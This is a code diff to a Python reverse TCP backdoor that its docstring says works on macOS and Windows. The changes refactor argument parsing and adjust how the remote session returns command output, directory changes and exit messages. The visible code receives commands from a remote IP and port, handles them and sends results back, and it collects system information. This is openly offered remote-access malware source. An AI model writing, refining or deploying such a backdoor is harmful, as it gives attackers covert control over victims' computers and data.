@@ -1,4 +1,3 @@
-import argparse
 import socket
 import os
 import platform
@@ -10,7 +9,7 @@ Reverse TCP backdoor works on OSX and Windows
 """
 
 def main():
-    args = init_argparse()
+    args = utils.init_argparse('TCP Reverse Shell')
     port = args.port
     ip = args.ip
 
@@ -21,13 +20,11 @@ def main():
             cmd = s.recv(1024).decode('utf-8').rstrip('\n')
 
             if cmd.strip() == 'exit':
-                s.sendall(b'Exitting...')
+                s.sendall(b'[+] Terminating remote session.')
                 break
 
             out = handle_cmd(cmd)
-
-            if out:
-                s.sendall(out.encode('utf-8'))
+            s.sendall(out.encode('utf-8'))
     
 
 def handle_cmd(cmd):
@@ -39,8 +36,9 @@ def handle_cmd(cmd):
 
         try:
             os.chdir(dir)
-        except FileNotFoundError as e:
-            return str(e) + '\n'
+            return os.getcwd()
+        except FileNotFoundError:
+            return '{dir} does not exist.'.format(dir=dir)
 
     # get system information
     if keyword == 'sys_info':
@@ -70,13 +68,6 @@ def sys_info():
             name=platform.node())
 
     return info
-
-
-def init_argparse():
-    parser = argparse.ArgumentParser(description="TCP reverse shell.")
-    parser.add_argument("--port", "-p", type=int, required=True, help="The port to transmit on.")
-    parser.add_argument("ip", type=str, help="The ip of the host to connect to.")
-    return parser.parse_args()
 
 
 if __name__ == '__main__':
